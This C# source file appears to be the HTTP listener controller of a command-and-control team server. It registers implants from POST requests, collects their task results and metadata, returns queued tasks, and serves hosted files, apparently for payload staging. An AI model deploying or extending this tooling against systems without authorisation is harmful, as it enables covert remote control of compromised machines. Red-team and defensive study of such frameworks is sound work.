using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Http.Extensions;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using TeamServer.Models.File;
using TeamServer.Services;
using BinarySerializer;
using Shared;
using Common.APIModels;
using Common.APIModels.WebHost;

namespace TeamServer.Models
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        public const string AuthorizationHeader = "Authorization";

        private IAgentService _agentService;
        private IFileService _fileService;
        private IListenerService _listenerService;
        private IBinMakerService _binMakerService;
        private ILoggerFactory _loggerFactory;
        private readonly IChangeTrackingService _changeTrackingService;
        private readonly IWebHostService _webHostService;
        private readonly ICryptoService _cryptoService;
        private readonly IAuditService _auditService;

        public HttpListenerController(IAgentService agentService,
            IFileService fileService,
            IListenerService listenerService,
            IBinMakerService binMakerService,
            ILoggerFactory loggerFactory,
            IChangeTrackingService changeTrackingService,
            IWebHostService webHostService,
            ICryptoService cryptoService,
            IAuditService auditService)
        {
            this._agentService=agentService;
            this._fileService = fileService;
            this._listenerService = listenerService;
            this._binMakerService = binMakerService;
            this._loggerFactory = loggerFactory;
            this._changeTrackingService = changeTrackingService;
            this._webHostService = webHostService;
            this._cryptoService = cryptoService;
            this._auditService = auditService;
        }


        private async Task<IActionResult> WebHost(string path)
        {
            Logger.Log($"WebHost request {path}");
            //var logger = _loggerFactory.CreateLogger("WebHost");
            //logger.LogInformation($"{id}");

            var log = new WebHostLog()
            {
                Path = path,
                Date = DateTime.UtcNow,
                UserAgent = this.HttpContext.Request.Headers.ContainsKey("UserAgent") ? this.HttpContext.Request.Headers["UserAgent"].ToString() : String.Empty,
                Url = this.HttpContext.Request.GetDisplayUrl(),
            };

            try
            {
                var fileContent = _webHostService.GetFile(path);

                if (fileContent == null)
                {
                    //logger.LogError($"NOT FOUND {fileName} from listener {listener.Name}");
                    //Logger.Log($"NOT FOUND {path}");
                    log.StatusCode = 404;
                    this._webHostService.Addlog(log);
                    return this.NotFound();
                }

                //Logger.Log($"GET {path}");

                log.StatusCode = 200;
                this._webHostService.Addlog(log);
                return this.File(fileContent, "application/octet-stream");
            }
            catch (Exception ex)
            {
                Logger.Log($"WebHost Error : {ex}");
                return NotFound("Error");
            }
        }

        public async Task<IActionResult> HandleRequest(string relativeUrl)
        {
            if (HttpContext.Request.Method == "POST")
            {
                return await this.HandleImplant();
            }
            else
            {
                return await this.WebHost(relativeUrl);
            }
        }

        private Agent GetOrCreateAgent(string agentId)
        {
            var agent = this._agentService.GetAgent(agentId);
            if (agent == null)
            {
                agent = new Agent(agentId);
                this._agentService.AddAgent(agent);
                this._changeTrackingService.TrackChange(ChangingElement.Agent, agentId);
            }
            return agent;
        }

        private async Task<NetFrame> CreateTaskFrame(string destination, AgentTask task)
        {
            var taskSer = await task.BinarySerializeAsync();
            return new NetFrame(string.Empty, destination, NetFrameType.Task, taskSer);
        }

        private async Task<T> ExtractFrameData<T>(NetFrame frame)
        {
            return await frame.Data.BinaryDeserializeAsync<T>();
        }



        private async Task<ActionResult> HandleImplant()
        {
            try
            {
                if (!Request.Headers.ContainsKey(AuthorizationHeader))
                    return this.NotFound();

                string agentId = Request.Headers[AuthorizationHeader];
                var agent = this.GetOrCreateAgent(agentId);

                agent.CheckIn();
                this._changeTrackingService.TrackChange(ChangingElement.Agent, agentId);


                string body;
                using (var sr = new StreamReader(HttpContext.Request.Body))
                    body = await sr.ReadToEndAsync();


                byte[] data = Convert.FromBase64String(body);
                var frames = await data.BinaryDeserializeAsync<List<NetFrame>>();

                foreach (var frame in frames)
                {
                    switch (frame.FrameType)
                    {
                        case NetFrameType.TaskResult:
                            {
                                var taskOutput = await this.ExtractFrameData<Shared.AgentTaskResult>(frame);
                                this._changeTrackingService.TrackChange(ChangingElement.Result, taskOutput.Id);
                                break;
                            }
                        case NetFrameType.CheckIn:
                            {
                                var metaData = await this.ExtractFrameData<Shared.AgentMetadata>(frame);
                                var ag = this.GetOrCreateAgent(agentId);
                                if (ag.Id != agent.Id)
                                    ag.RelayId = agent.Id;

                                ag.Metadata = metaData;
                                this._changeTrackingService.TrackChange(ChangingElement.Metadata, metaData.Id);
                                break;
                            }

                        default:
                            break;
                    }
                }

                var returnedFrames = new List<NetFrame>();

                var task = new Shared.AgentTask()
                {
                    Id = Guid.NewGuid().ToString(),
                    CommandId = CommandId.CheckIn,
                    Parameters = null
                };

                //if (!string.IsNullOrEmpty(agentId))
                //{
                //    list.Add(new NetFrame(string.Empty, agentId, NetFrameType.Task, await task.BinarySerializeAsync()));
                //}

                foreach (var t in agent.GetPendingTaks())
                    returnedFrames.Add(await this.CreateTaskFrame(agent.Id, t));


                var ser = await returnedFrames.BinarySerializeAsync();
                var b64 = Convert.ToBase64String(ser);
                return Ok(b64);

            }
            catch (Exception ex)
            {
                throw ex;
            }

            //string json = null;
            //try
            //{
            //    json = _cryptoService.DecryptFromBase64(body);

            //}
            //catch
            //{
            //    Logger.Log($"Error decrypting agent messages.");
            //    //Decrypt failed
            //    return NotFound();
            //}

            //try
            //{
            //    result = JsonConvert.DeserializeObject<List<MessageResult>>(json);
            //}
            //catch
            //{
            //    Logger.Log($"Error deserializing agent messages.");
            //    //json in bad format
            //    return NotFound();
            //}


            //foreach (var messRes in result)
            //{
            //    if (messRes.Header.Path.Count() == 1)
            //    {
            //        id = messRes.Header.Owner;
            //        break;
            //    }
            //}

            //if(string.IsNullOrEmpty(id))
            //{
            //    //no main agent
            //    return NotFound();
            //}

            //var messages = new List<MessageTask>();
            //try
            //{
            //    foreach (var messRes in result)
            //    {
            //        var agentId = messRes.Header.Owner;
            //        var messAgent = this.CheckIn(messRes.Header.Owner);

            //        if (messRes.MetaData != null)
            //        {
            //            messAgent.Metadata = messRes.MetaData;
            //            this._changeTrackingService.TrackChange(ChangingElement.Agent, messAgent.Id);
            //        }

            //        messAgent.AddTaskResults(messRes.Items);
            //        foreach (var res in messRes.Items)
            //            this._changeTrackingService.TrackChange(ChangingElement.Result, res.Id);

            //        messAgent.RelayId = id;
            //        if (messAgent.Path != messRes.Header.Path)
            //        {
            //            messAgent.Path = messRes.Header.Path;
            //            this._changeTrackingService.TrackChange(ChangingElement.Agent, messAgent.Id);
            //        }
            //        if (messRes.FileChunk != null)
            //            _fileService.AddAgentFileChunk(messRes.FileChunk);

            //        messAgent.AddProxyResponses(messRes.ProxyMessages);

            //        ////Logger.Log($"Saving resulst of {messAgent.Metadata.Id}");
            //        _fileService.SaveResults(messAgent, messRes.Items);
            //    }



            //    foreach (var ag in this._agentService.GetAgentToRelay(id))
            //    {
            //        var mess = ag.GetNextMessage();
            //        if (mess != null)
            //            messages.Add(mess);
            //    }
            //}
            //catch(Exception ex)
            //{
            //    System.Diagnostics.Debug.WriteLine(ex.ToString());
            //    throw;
            //}

            //var camelSettings = new JsonSerializerSettings { ContractResolver = new Newtonsoft.Json.Serialization.CamelCasePropertyNamesContractResolver() };
            //var ret = JsonConvert.SerializeObject(messages, camelSettings);
            //var enc = this._cryptoService.EncryptAsBase64(ret);

            //if (enc.Length == 0)
            //{
            //    int i = 0;
            //}

            //return Ok(enc);
        }

        //private Agent CheckIn(string agentId)
        //{
        //    var agent = this._agentService.GetAgent(agentId);

        //    this._changeTrackingService.TrackChange(ChangingElement.Agent, agentId);

        //    if (agent == null)
        //    {
        //        agent = new Agent(agentId);
        //        this._agentService.AddAgent(agent);
        //        var meta = new AgentTask() { Command = "meta", Id = Guid.NewGuid().ToString(), Label = "MetaData", RequestDate = DateTime.UtcNow };
        //        agent.QueueTask(meta);
        //        this._changeTrackingService.TrackChange(ChangingElement.Task, meta.Id);

        //        this._auditService.Record(AuditType.Info, AuditCategory.Agent, agentId, string.Empty, $"Agent Checking In");
        //    }

        //    agent.CheckIn();

        //    return agent;
        //}
    }
}
